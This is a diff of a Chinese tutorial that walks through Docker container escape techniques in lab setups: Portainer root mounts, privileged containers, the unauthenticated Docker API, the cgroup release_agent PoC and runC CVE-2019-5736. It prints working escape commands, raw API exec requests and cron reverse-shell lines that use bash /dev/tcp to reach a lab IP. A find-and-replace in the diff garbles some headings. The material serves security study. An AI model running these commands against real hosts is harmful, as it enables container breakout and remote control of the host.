@@ -1,4 +1,4 @@
-# Docker逃逸那些事儿
+# Docker逃逸漏洞案例漏洞案例
 
 
 
@@ -14,19 +14,19 @@ Docker是一个开源的引擎,可以轻松的为任何应用创建一个轻量�
 
 1. 是否存在.dockerenv文件，若该文件存在则为docker环境，若不存在该文件则当前环境非docker环境`ls -alh /.dockerenv`
 
-![img](Docker逃逸.assets/v2-f93a64c36440021de02448c3d67e97c2_720w.webp)
+![img](Docker逃逸漏洞案例.assets/v2-f93a64c36440021de02448c3d67e97c2_720w.webp)
 
-![img](Docker逃逸.assets/v2-3d846f9995f97fd52b62631c8d784292_720w.webp)
+![img](Docker逃逸漏洞案例.assets/v2-3d846f9995f97fd52b62631c8d784292_720w.webp)
 
 2. 查询系统进程的cgroup信息，docker环境中的cgroup文件普遍存在docker字段，而真实环境中不存在docker字段`cat /proc/1/cgroup`
 
-![img](Docker逃逸.assets/v2-9dfd492197b9fabfc899b63ad4cf05f0_720w.png)
+![img](Docker逃逸漏洞案例.assets/v2-9dfd492197b9fabfc899b63ad4cf05f0_720w.png)
 
-![img](Docker逃逸.assets/v2-1644cf329126b3577be751ff6a64141e_720w.webp)
+![img](Docker逃逸漏洞案例.assets/v2-1644cf329126b3577be751ff6a64141e_720w.webp)
 
-## **Docker逃逸**
+## **Docker逃逸漏洞案例**
 
-Docker容器是使用沙盒机制，是单独的系统，理论上是很安全的，通过利用某种手段，再结合执行EXP或POC，就可以返回一个宿主机的高权限shell，并拿到宿主机的root权限，可以直接操作宿主机文件，从容器中逃了出来，因此我们将其称为Docker逃逸漏洞。
+Docker容器是使用沙盒机制，是单独的系统，理论上是很安全的，通过利用某种手段，再结合执行EXP或POC，就可以返回一个宿主机的高权限shell，并拿到宿主机的root权限，可以直接操作宿主机文件，从容器中逃了出来，因此我们将其称为Docker逃逸漏洞案例漏洞。
 
 ## **Portainer后台挂载宿主机根目录进行逃逸**
 
@@ -37,52 +37,52 @@ Portainer是一个可视化的容器镜像的图形管理工具，利用Portaine
 
 在安装了docker的物理机中运行该命令`docker run -d -p 8000:8000 -p 9000:9000 --name=portainer --restart=always -v  /var/run/docker.sock:/var/run/docker.sock -v portainer_data:/data  portainer/portainer-ce`
 
-![img](Docker逃逸.assets/v2-fcfb220a4f2770fa1dc10eae496754eb_720w.png)
+![img](Docker逃逸漏洞案例.assets/v2-fcfb220a4f2770fa1dc10eae496754eb_720w.png)
 
 
 部署成功后访问宿主机的9000端口，设置用户名与密码
 
-![img](Docker逃逸.assets/v2-60dfa850b4ceffb509388cd2f1d0e3a1_720w.webp)
+![img](Docker逃逸漏洞案例.assets/v2-60dfa850b4ceffb509388cd2f1d0e3a1_720w.webp)
 
-![img](Docker逃逸.assets/v2-49fb2aea615c459697a35e801c3b06af_720w.png)
+![img](Docker逃逸漏洞案例.assets/v2-49fb2aea615c459697a35e801c3b06af_720w.png)
 
 ### **漏洞利用**
 
 进入容器中，添加一个新容器
 
-![img](Docker逃逸.assets/v2-9a37cf12ad1de9a50b3e025a01f029ee_720w.png)
+![img](Docker逃逸漏洞案例.assets/v2-9a37cf12ad1de9a50b3e025a01f029ee_720w.png)
 
 进入到portainer后台界面
 
-![img](Docker逃逸.assets/v2-30c70213aeefe65781d08e1f6437834f_720w.png)
+![img](Docker逃逸漏洞案例.assets/v2-30c70213aeefe65781d08e1f6437834f_720w.png)
 
 这里给该容器命名并选择一个镜像
 
-![img](Docker逃逸.assets/v2-b8cf765fa83b56b5ed737699ac46bbbf_720w.png)
+![img](Docker逃逸漏洞案例.assets/v2-b8cf765fa83b56b5ed737699ac46bbbf_720w.png)
 
 下滑到Advanced container settings将console设置为interactive & tty
 
-![img](Docker逃逸.assets/v2-49c324418ebd58b1f7f3dc9ccba292fb_720w.png)
+![img](Docker逃逸漏洞案例.assets/v2-49c324418ebd58b1f7f3dc9ccba292fb_720w.png)
 
 然后到Volumes中将根目录挂载到容器中
 
-![img](Docker逃逸.assets/v2-3496a2bc1e7b042ac5297e0a5392c2d8_720w.png)
+![img](Docker逃逸漏洞案例.assets/v2-3496a2bc1e7b042ac5297e0a5392c2d8_720w.png)
 
-![image-20231008150906969](Docker逃逸.assets/image-20231008150906969.png)
+![image-20231008150906969](Docker逃逸漏洞案例.assets/image-20231008150906969.png)
 
 然后点击部署即可
 
-![image-20231008150916195](Docker逃逸.assets/image-20231008150916195.png)
+![image-20231008150916195](Docker逃逸漏洞案例.assets/image-20231008150916195.png)
 
 部署成功后回到容器中，进入到该容器终端内
 进入到终端后，输入如下命令`ls /tide/`
 `chroot /tide/ bash`
 
-![image-20231008150936304](Docker逃逸.assets/image-20231008150936304.png)
+![image-20231008150936304](Docker逃逸漏洞案例.assets/image-20231008150936304.png)
 
 如此成功逃逸到宿主机中，也可直接反弹shell`echo '* * * * * bash -i >& /dev/tcp/192.168.198.128/8888 0>&1' >> /var/spool/cron/root`
 
-![img](Docker逃逸.assets/v2-e5453e0367177cd23a9f28acef0f0dca_720w.webp)
+![img](Docker逃逸漏洞案例.assets/v2-e5453e0367177cd23a9f28acef0f0dca_720w.webp)
 
 ## **privileged特权模式启动容器**
 
@@ -124,31 +124,31 @@ Portainer是一个可视化的容器镜像的图形管理工具，利用Portaine
 
 在容器中可以使用该命令检测当前容器是否以特权模式启动`cat /proc/self/status | grep Cap`如果是特权模式启动的话，CapEff对应的掩码值在centos中为 0000001fffffffff ，在ubuntu中为0000003fffffffff，如下图
 
-![img](Docker逃逸.assets/v2-4b4e4a809693c2dad50d2204fc7ee253_720w.png)
+![img](Docker逃逸漏洞案例.assets/v2-4b4e4a809693c2dad50d2204fc7ee253_720w.png)
 
-![img](Docker逃逸.assets/v2-c236cf8292744b21a47aa6537c410620_720w.png)
+![img](Docker逃逸漏洞案例.assets/v2-c236cf8292744b21a47aa6537c410620_720w.png)
 
 ### **环境搭建**
 
 在安装有docker机器的主机上直接运行该命令，启动该容器即可。`docker run -it --privileged ubuntu:18.04  `
 
-![img](Docker逃逸.assets/v2-3eba16d5d2dda5570840d7d37c082efc_720w.png)
+![img](Docker逃逸漏洞案例.assets/v2-3eba16d5d2dda5570840d7d37c082efc_720w.png)
 
 ### **漏洞利用**
 
 首先我们为了区别宿主机与docker容器的区别，我们先在宿主机中新建一个文件，作为标识区别
 
-![image-20231008151105176](Docker逃逸.assets/image-20231008151105176.png)
+![image-20231008151105176](Docker逃逸漏洞案例.assets/image-20231008151105176.png)
 
 
 在启动后我们会进入到docker容器的bash中，在这里我们查看当前主机的docker是否为特权模式启动。`cat /proc/self/status | grep Cap`
 
-![image-20231008151112952](Docker逃逸.assets/image-20231008151112952.png)
+![image-20231008151112952](Docker逃逸漏洞案例.assets/image-20231008151112952.png)
 
 
 我们可以将宿主机目录挂载到该docker容器中，首先查看当前磁盘分区情况，获得宿主机分区`fdisk -l `
 
-![image-20231008151120168](Docker逃逸.assets/image-20231008151120168.png)
+![image-20231008151120168](Docker逃逸漏洞案例.assets/image-20231008151120168.png)
 
 这里我们根据分区大小得知到宿主机的磁盘为/dev/dm-0，这时可以直接挂载宿主机的磁盘
 
@@ -156,22 +156,22 @@ Portainer是一个可视化的容器镜像的图形管理工具，利用Portaine
 `mount /dev/dm-0 /tide/`
 `chroot /tide/`
 
-![image-20231008151137407](Docker逃逸.assets/image-20231008151137407.png)
+![image-20231008151137407](Docker逃逸漏洞案例.assets/image-20231008151137407.png)
 
 
 这时我们会进入一个bash会话，在这里可以查看宿主机的/etc/passwd等敏感文件
 
-![image-20231008151145940](Docker逃逸.assets/image-20231008151145940.png)
+![image-20231008151145940](Docker逃逸漏洞案例.assets/image-20231008151145940.png)
 
 
 这时去查看刚刚我们在宿主机根目录中创建的flag.txt文件，看其是否存在，就能判断出我们当前是否已经成功跳出docker容器
 
-![image-20231008151155099](Docker逃逸.assets/image-20231008151155099.png)
+![image-20231008151155099](Docker逃逸漏洞案例.assets/image-20231008151155099.png)
 
 
 这里可以看到我们现在已经成功跳出了docker容器，获得了宿主机的权限，可以使用计划任务反弹shell`echo '* * * * * bash -i >& /dev/tcp/192.168.198.128/8888 0>&1' >> /var/spool/cron/root`
 
-![image-20231008151203454](Docker逃逸.assets/image-20231008151203454.png)
+![image-20231008151203454](Docker逃逸漏洞案例.assets/image-20231008151203454.png)
 
 ## **Docker API 未授权访问**
 
@@ -184,38 +184,38 @@ Portainer是一个可视化的容器镜像的图形管理工具，利用Portaine
 `docker-compose up -d `
 `docker-compose ps `
 
-![img](Docker逃逸.assets/v2-df19c00ef140ee6ab3301fddf39861e6_720w.webp)
+![img](Docker逃逸漏洞案例.assets/v2-df19c00ef140ee6ab3301fddf39861e6_720w.webp)
 
 也可以在真实Docker中部署该环境，部署步骤如下：`#下载环境`
 `curl -o /etc/yum.repos.d/Centos-7.repo http://mirrors.aliyun.com/repo/Centos-7.repo`
 `curl -o /etc/yum.repos.d/docker-ce.repo http://mirrors.aliyun.com/docker-ce/linux/centos/docker-ce.repo`
 `yum clean all && yum makecache`
 
-![img](Docker逃逸.assets/v2-c5faafb867b7b24d6f6adf31c8d30176_720w.png)
+![img](Docker逃逸漏洞案例.assets/v2-c5faafb867b7b24d6f6adf31c8d30176_720w.png)
 
 安装指定版本docker` yum install -y docker-ce-18.09.9  `
 
-![img](Docker逃逸.assets/v2-5a893d1784aecf0f38c8220bc9915b35_720w.png)
+![img](Docker逃逸漏洞案例.assets/v2-5a893d1784aecf0f38c8220bc9915b35_720w.png)
 
 配置加速源` vim /etc/docker/daemon.json`
 ` { "registry-mirrors" : [ "https://8xpk5wnt.mirror.aliyuncs.com" ]}`
 
-![img](Docker逃逸.assets/v2-7ccf8e29ac0769675c7c1a04b5b72f29_720w.png)
+![img](Docker逃逸漏洞案例.assets/v2-7ccf8e29ac0769675c7c1a04b5b72f29_720w.png)
 
 设置开机自启：`systemctl enable docker `
 `systemctl daemon-reload`
 
-![img](Docker逃逸.assets/v2-5f4e02373b6f82a4c89d63618033bab0_720w.png)
+![img](Docker逃逸漏洞案例.assets/v2-5f4e02373b6f82a4c89d63618033bab0_720w.png)
 
 启动contianerd服务：`containerd  #启动`
 `systemctl status containerd # 查看服务状态`
 
-![img](Docker逃逸.assets/v2-80d6498a6e3afeea5ec32644caab98ca_720w.png)
+![img](Docker逃逸漏洞案例.assets/v2-80d6498a6e3afeea5ec32644caab98ca_720w.png)
 
 开启2375端口，提供外部访问：`vim /usr/lib/systemd/system/docker.service`
 `ExecStart=/usr/bin/dockerd -H tcp://0.0.0.0:2375  -H fd:// --containerd=/run/containerd/containerd.sock`
 
-![img](Docker逃逸.assets/v2-7684d1e7baf866f6eb662ff975b01d51_720w.png)
+![img](Docker逃逸漏洞案例.assets/v2-7684d1e7baf866f6eb662ff975b01d51_720w.png)
 
 改完之后需要重启：`systemctl daemon-reload`
 `systemctl restart docker `
@@ -227,15 +227,15 @@ Portainer是一个可视化的容器镜像的图形管理工具，利用Portaine
 
 接下来我们访问该ip的2375端口即可，当我们访问时会返回 404 page not found。这是 Docker RemoteAPI，可以执行docker命令。
 
-![image-20231008151257015](Docker逃逸.assets/image-20231008151257015.png)
+![image-20231008151257015](Docker逃逸漏洞案例.assets/image-20231008151257015.png)
 
 这里如果我们继续访问[http://192.168.198.129:2375/version](https://link.zhihu.com/?target=http%3A//192.168.198.129%3A2375/version)，会返回docker的版本信息，这样证明该漏洞存在。
 
-![image-20231008151305785](Docker逃逸.assets/image-20231008151305785.png)
+![image-20231008151305785](Docker逃逸漏洞案例.assets/image-20231008151305785.png)
 
 比如访问 [http://192.168.198.129:2375/containers/json](https://link.zhihu.com/?target=http%3A//192.168.198.129%3A2375/containers/json) 会返回docker信息，和在docker CLI上执行 docker ps 的效果一样，其他操作比如创建/删除container，拉取image等操作也都可以通过API调用完成。
 
-![image-20231008151315859](Docker逃逸.assets/image-20231008151315859.png)
+![image-20231008151315859](Docker逃逸漏洞案例.assets/image-20231008151315859.png)
 
 ### **漏洞利用**
 
@@ -243,7 +243,7 @@ Portainer是一个可视化的容器镜像的图形管理工具，利用Portaine
 
 访问 [http://192.168.198.129:2375/containers/json](https://link.zhihu.com/?target=http%3A//192.168.198.129%3A2375/containers/json) 获得刚刚返回的exec_id的参数，构造如下数据包：
 
-![image-20231008151325115](Docker逃逸.assets/image-20231008151325115.png)
+![image-20231008151325115](Docker逃逸漏洞案例.assets/image-20231008151325115.png)
 
 `POST /containers/7badb971f85814c718dcc4efdd34fead171ebdbb099bc5252f02785374e24b0f/exec HTTP/1.1`
 `Host: 192.168.198.138:2375`
@@ -261,7 +261,7 @@ Portainer是一个可视化的容器镜像的图形管理工具，利用Portaine
 `"Tty":true`
 `}`注意其中cmd的字段，这就是我们要执行的命令，发送后会得到第二个id，这里需构造一个exec_start数据包，内容如下。
 
-![image-20231008151335795](Docker逃逸.assets/image-20231008151335795.png)
+![image-20231008151335795](Docker逃逸漏洞案例.assets/image-20231008151335795.png)
 
 ```
 POST /exec/962fee39c29a2c9d5ea984b55673a7823aa06b6187eaf4be279f25af6cecad1f/start HTTP/1.1`
@@ -274,7 +274,7 @@ POST /exec/962fee39c29a2c9d5ea984b55673a7823aa06b6187eaf4be279f25af6cecad1f/star
 `}
 ```
 
-![image-20231008151350156](Docker逃逸.assets/image-20231008151350156.png)
+![image-20231008151350156](Docker逃逸漏洞案例.assets/image-20231008151350156.png)
 
 然后发送就会得到结果，至此成功获得该docker主机的rce权限，但无法逃逸到宿主机中。
 
@@ -384,7 +384,7 @@ docker使用cgroup进行资源限制，当cgroup中最后一个任务结束且no
 docker run --rm -it --cap-add=SYS_ADMIN --security-opt apparmor=unconfined ubuntu:18.04  
 ~~~
 
-![image-20231008151550551](Docker逃逸.assets/image-20231008151550551.png)
+![image-20231008151550551](Docker逃逸漏洞案例.assets/image-20231008151550551.png)
 
 ### **漏洞利用**
 
@@ -405,7 +405,7 @@ chmod a+x /cmd
 sh -c "echo \$\$ > /tmp/cgrp/x/cgroup.procs" 
 ```
 
-![image-20231008151559045](Docker逃逸.assets/image-20231008151559045.png)
+![image-20231008151559045](Docker逃逸漏洞案例.assets/image-20231008151559045.png)
 
 如上图所示，成功获取到宿主机根目录的flag.txt的内容，同理，我们将上面poc中的echo中的命令修改为反弹shell的命令，即可进行反弹shell，获得宿主机的权限。
 
@@ -415,7 +415,7 @@ chmod a+x /cmd
 sh -c "echo \$\$ > /tmp/cgrp/x/cgroup.procs" 
 ```
 
-![image-20231008151609076](Docker逃逸.assets/image-20231008151609076.png)
+![image-20231008151609076](Docker逃逸漏洞案例.assets/image-20231008151609076.png)
 
 ## **runC逃逸-CVE-2019-5736**
 
@@ -435,7 +435,7 @@ docker version <=18.09.2 RunC version <=1.0-rc6
 curl https://gist.githubusercontent.com/thinkycx/e2c9090f035d7b09156077903d6afa51/raw -o install.sh && bash install.sh  
 ```
 
-![image-20231008151619854](Docker逃逸.assets/image-20231008151619854.png)
+![image-20231008151619854](Docker逃逸漏洞案例.assets/image-20231008151619854.png)
 
 另外可以使用 Metarget去直接部署环境，操作命令如下：
 安装Metarget
@@ -446,7 +446,7 @@ cd metarget/
 pip3 install -r requirements.txt
 ```
 
-![image-20231008151628250](Docker逃逸.assets/image-20231008151628250.png)
+![image-20231008151628250](Docker逃逸漏洞案例.assets/image-20231008151628250.png)
 
 部署cve-2019-5736
 
@@ -454,7 +454,7 @@ pip3 install -r requirements.txt
 ./metarget cnv install cve-2019-5736
 ```
 
-![image-20231008151637425](Docker逃逸.assets/image-20231008151637425.png)
+![image-20231008151637425](Docker逃逸漏洞案例.assets/image-20231008151637425.png)
 
 如上，已成功搭建好符合版本的docker环境，接下来我们启动一个docker容器即可
 
@@ -462,7 +462,7 @@ pip3 install -r requirements.txt
 docker run -it ubuntu:18.04
 ```
 
-![image-20231008151648920](Docker逃逸.assets/image-20231008151648920.png)
+![image-20231008151648920](Docker逃逸漏洞案例.assets/image-20231008151648920.png)
 
 ### **漏洞利用**
 
@@ -472,11 +472,11 @@ docker run -it ubuntu:18.04
 git clone https://github.com/Frichetten/CVE-2019-5736-PoC 
 ```
 
-![image-20231008151657142](Docker逃逸.assets/image-20231008151657142.png)
+![image-20231008151657142](Docker逃逸漏洞案例.assets/image-20231008151657142.png)
 
 修改payload为反弹shell
 
-![image-20231008151704945](Docker逃逸.assets/image-20231008151704945.png)
+![image-20231008151704945](Docker逃逸漏洞案例.assets/image-20231008151704945.png)
 
 修改完之后进行编译，
 
@@ -484,7 +484,7 @@ git clone https://github.com/Frichetten/CVE-2019-5736-PoC
 CGO_ENABLED=0 GOOS=linux GOARCH=amd64 go build main.go 
 ```
 
-![image-20231008151713095](Docker逃逸.assets/image-20231008151713095.png)
+![image-20231008151713095](Docker逃逸漏洞案例.assets/image-20231008151713095.png)
 
 编译后会生成一个main的可执行文件，这里我们需要将其放到docker容器中，在kali中启动一个http服务，在容器中使用wget的命令去下载该文件
 
@@ -492,7 +492,7 @@ CGO_ENABLED=0 GOOS=linux GOARCH=amd64 go build main.go
 python3 -m http.server 8080
 ```
 
-![image-20231008151721117](Docker逃逸.assets/image-20231008151721117.png)
+![image-20231008151721117](Docker逃逸漏洞案例.assets/image-20231008151721117.png)
 
 在docker容器中下载该exp，并赋予执行权限，执行
 
@@ -502,7 +502,7 @@ chmod u+x main
 ./main
 ```
 
-![image-20231008151732401](Docker逃逸.assets/image-20231008151732401.png)
+![image-20231008151732401](Docker逃逸漏洞案例.assets/image-20231008151732401.png)
 
 然后这里我们假装为宿主机管理员，现在进入到该容器中
 
@@ -511,14 +511,14 @@ docker ps
 docker exec -it 3056c91f69ea
 ```
 
-![image-20231008151740181](Docker逃逸.assets/image-20231008151740181.png)
+![image-20231008151740181](Docker逃逸漏洞案例.assets/image-20231008151740181.png)
 
 这时再来看我们的docker容器里执行的exp已然被执行
 
-![img](Docker逃逸.assets/v2-29242efcee38fd28b492d991bcdcccab_720w.png)
+![img](Docker逃逸漏洞案例.assets/v2-29242efcee38fd28b492d991bcdcccab_720w.png)
 
 但是奇怪的是并没有反弹过来shell，其他命令也无法被执行，修改了n次paylaod也无果，希望有成功的大佬能告知小弟步骤哪里错了。
-至此，Docker逃逸章节完结，撒花~~
+至此，Docker逃逸漏洞案例章节完结，撒花~~
 
 
 
